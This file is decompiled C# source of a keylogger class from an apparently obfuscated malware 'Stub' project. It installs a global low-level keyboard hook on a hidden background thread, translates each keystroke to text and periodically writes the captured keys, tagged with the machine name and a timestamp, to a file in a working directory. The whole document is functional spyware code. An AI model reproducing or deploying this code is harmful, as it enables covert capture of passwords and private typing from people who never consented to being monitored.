using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using dg3ypDAonQcOidMs0w;
using rE4lpnT863QnijKQK5;

namespace Stub
{
	// Token: 0x02000092 RID: 146
	internal sealed class Keylogger
	{
		// Token: 0x060001AE RID: 430
		[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		private static extern IntPtr SetWindowsHookEx(int idHook, Keylogger.LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

		// Token: 0x060001AF RID: 431
		[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		private static extern bool UnhookWindowsHookEx(IntPtr hhk);

		// Token: 0x060001B0 RID: 432
		[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

		// Token: 0x060001B1 RID: 433
		[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		private static extern IntPtr GetModuleHandle(string lpModuleName);

		// Token: 0x060001B2 RID: 434 RVA: 0x00013ED0 File Offset: 0x000120D0
		public static void Start()
		{
			if (!Keylogger._isRunning)
			{
				Keylogger._isRunning = true;
				Keylogger._keyloggerThread = new Thread(new ThreadStart(Keylogger.RunKeylogger));
				Keylogger._keyloggerThread.IsBackground = true;
				Keylogger._keyloggerThread.Start();
			}
		}

		// Token: 0x060001B3 RID: 435 RVA: 0x00003DBE File Offset: 0x00001FBE
		private static void RunKeylogger()
		{
			Keylogger._hookID = Keylogger.SetHook(Keylogger._proc);
			Application.Run();
			Keylogger.UnhookWindowsHookEx(Keylogger._hookID);
		}

		// Token: 0x060001B4 RID: 436 RVA: 0x00013F18 File Offset: 0x00012118
		private static IntPtr SetHook(Keylogger.LowLevelKeyboardProc proc)
		{
			return Keylogger.SetWindowsHookEx(13, proc, Keylogger.GetModuleHandle(null), 0U);
		}

		// Token: 0x060001B5 RID: 437 RVA: 0x00013F38 File Offset: 0x00012138
		private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
		{
			if (nCode >= 0 && (wParam == (IntPtr)256 || wParam == (IntPtr)260))
			{
				int num = Marshal.ReadInt32(lParam);
				Keys keys = (Keys)num;
				string keyString = Keylogger.GetKeyString(keys);
				object @lock = Keylogger._lock;
				lock (@lock)
				{
					Keylogger._capturedKeys.Add(keyString);
					if (keys == Keys.Space || keys == Keys.Return || keys == Keys.Tab)
					{
						Keylogger._wordCount++;
					}
					if (Keylogger._wordCount >= 100)
					{
						Keylogger.SaveToFile();
						Keylogger._wordCount = 0;
						Keylogger._capturedKeys.Clear();
					}
				}
			}
			return Keylogger.CallNextHookEx(Keylogger._hookID, nCode, wParam, lParam);
		}

		// Token: 0x060001B6 RID: 438 RVA: 0x00014014 File Offset: 0x00012214
		private static string GetKeyString(Keys key)
		{
			if (key <= Keys.RWin)
			{
				if (key <= Keys.Tab)
				{
					if (key == Keys.Back)
					{
						return "[BACKSPACE]";
					}
					if (key == Keys.Tab)
					{
						return "[TAB]";
					}
				}
				else
				{
					if (key == Keys.Return)
					{
						return "[ENTER]\n";
					}
					switch (key)
					{
					case Keys.Capital:
						return "[CAPSLOCK]";
					case Keys.KanaMode:
					case Keys.RButton | Keys.MButton | Keys.ShiftKey:
					case Keys.JunjaMode:
					case Keys.FinalMode:
					case Keys.HanjaMode:
					case Keys.RButton | Keys.Back | Keys.ShiftKey:
					case Keys.IMEConvert:
					case Keys.IMENonconvert:
					case Keys.IMEAccept:
					case Keys.IMEModeChange:
					case Keys.Select:
					case Keys.Print:
					case Keys.Execute:
						break;
					case Keys.Escape:
						return "[ESC]";
					case Keys.Space:
						return " ";
					case Keys.Prior:
						return "[PAGEUP]";
					case Keys.Next:
						return "[PAGEDOWN]";
					case Keys.End:
						return "[END]";
					case Keys.Home:
						return "[HOME]";
					case Keys.Left:
						return "[LEFT]";
					case Keys.Up:
						return "[UP]";
					case Keys.Right:
						return "[RIGHT]";
					case Keys.Down:
						return "[DOWN]";
					case Keys.Snapshot:
						return "[PRINTSCREEN]";
					case Keys.Insert:
						return "[INSERT]";
					case Keys.Delete:
						return "[DELETE]";
					default:
						if (key - Keys.LWin <= 1)
						{
							return "[WIN]";
						}
						break;
					}
				}
			}
			else if (key <= Keys.Scroll)
			{
				switch (key)
				{
				case Keys.F1:
					return "[F1]";
				case Keys.F2:
					return "[F2]";
				case Keys.F3:
					return "[F3]";
				case Keys.F4:
					return "[F4]";
				case Keys.F5:
					return "[F5]";
				case Keys.F6:
					return "[F6]";
				case Keys.F7:
					return "[F7]";
				case Keys.F8:
					return "[F8]";
				case Keys.F9:
					return "[F9]";
				case Keys.F10:
					return "[F10]";
				case Keys.F11:
					return "[F11]";
				case Keys.F12:
					return "[F12]";
				default:
					if (key == Keys.NumLock)
					{
						return "[NUMLOCK]";
					}
					if (key == Keys.Scroll)
					{
						return "[SCROLLLOCK]";
					}
					break;
				}
			}
			else
			{
				switch (key)
				{
				case Keys.LShiftKey:
				case Keys.RShiftKey:
					return "[SHIFT]";
				case Keys.LControlKey:
				case Keys.RControlKey:
					return "[CTRL]";
				case Keys.LMenu:
				case Keys.RMenu:
					return "[ALT]";
				default:
					switch (key)
					{
					case Keys.OemSemicolon:
						return ";";
					case Keys.Oemplus:
						return "=";
					case Keys.Oemcomma:
						return ",";
					case Keys.OemMinus:
						return "-";
					case Keys.OemPeriod:
						return ".";
					case Keys.OemQuestion:
						return "/";
					case Keys.Oemtilde:
						return "`";
					default:
						switch (key)
						{
						case Keys.OemOpenBrackets:
							return "[";
						case Keys.OemPipe:
							return "\\";
						case Keys.OemCloseBrackets:
							return "]";
						case Keys.OemQuotes:
							return "'";
						}
						break;
					}
					break;
				}
			}
			string text;
			if (key >= Keys.D0 && key <= Keys.D9)
			{
				text = ((char)key).ToString();
			}
			else if (key >= Keys.A && key <= Keys.Z)
			{
				text = ((char)key).ToString();
			}
			else if (key >= Keys.NumPad0 && key <= Keys.NumPad9)
			{
				text = (key - Keys.NumPad0).ToString();
			}
			else
			{
				text = string.Format("[{0}]", key);
			}
			return text;
		}

		// Token: 0x060001B7 RID: 439 RVA: 0x000143D8 File Offset: 0x000125D8
		private static void SaveToFile()
		{
			try
			{
				if (Keylogger._capturedKeys.Count != 0)
				{
					string machineName = Environment.MachineName;
					string text = DateTime.Now.ToString("yyyyMMdd_HHmmss");
					string text2 = machineName + "_" + text + ".txt";
					string text3 = Paths.InitWorkDir();
					string text4 = Path.Combine(text3, text2);
					Directory.CreateDirectory(text3);
					StringBuilder stringBuilder = new StringBuilder();
					stringBuilder.AppendLine(string.Format("Keylogger started: {0}", DateTime.Now));
					stringBuilder.AppendLine("Machine: " + machineName);
					stringBuilder.AppendLine("Captured keystrokes:");
					stringBuilder.AppendLine("-------------------");
					foreach (string text5 in Keylogger._capturedKeys)
					{
						stringBuilder.Append(text5);
					}
					File.WriteAllText(text4, stringBuilder.ToString());
				}
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x060001B8 RID: 440 RVA: 0x000038B4 File Offset: 0x00001AB4
		public Keylogger()
		{
			hHEYokUTtehNq5ji0d.QgAwAnEzW2N9V();
			base..ctor();
		}

		// Token: 0x060001B9 RID: 441 RVA: 0x000144F8 File Offset: 0x000126F8
		static Keylogger()
		{
			WP6RZJql8gZrNhVA9v.prXoP4RuYp();
			hHEYokUTtehNq5ji0d.QgAwAnEzW2N9V();
			Keylogger._proc = new Keylogger.LowLevelKeyboardProc(Keylogger.HookCallback);
			Keylogger._hookID = IntPtr.Zero;
			Keylogger._capturedKeys = new List<string>();
			Keylogger._isRunning = false;
			Keylogger._wordCount = 0;
			Keylogger._lock = new object();
		}

		// Token: 0x040004D6 RID: 1238
		private static Keylogger.LowLevelKeyboardProc _proc;

		// Token: 0x040004D7 RID: 1239
		private static IntPtr _hookID;

		// Token: 0x040004D8 RID: 1240
		private static List<string> _capturedKeys;

		// Token: 0x040004D9 RID: 1241
		private static Thread _keyloggerThread;

		// Token: 0x040004DA RID: 1242
		private static bool _isRunning;

		// Token: 0x040004DB RID: 1243
		private static int _wordCount;

		// Token: 0x040004DC RID: 1244
		private static readonly object _lock;

		// Token: 0x02000093 RID: 147
		private sealed class LowLevelKeyboardProc : MulticastDelegate
		{
			// Token: 0x060001BA RID: 442
			public extern LowLevelKeyboardProc(object @object, IntPtr method);

			// Token: 0x060001BB RID: 443
			public extern IntPtr Invoke(int nCode, IntPtr wParam, IntPtr lParam);

			// Token: 0x060001BC RID: 444
			public extern IAsyncResult BeginInvoke(int nCode, IntPtr wParam, IntPtr lParam, AsyncCallback callback, object @object);

			// Token: 0x060001BD RID: 445
			public extern IntPtr EndInvoke(IAsyncResult result);

			// Token: 0x060001BE RID: 446 RVA: 0x000038AD File Offset: 0x00001AAD
			static LowLevelKeyboardProc()
			{
				WP6RZJql8gZrNhVA9v.prXoP4RuYp();
			}
		}
	}
}
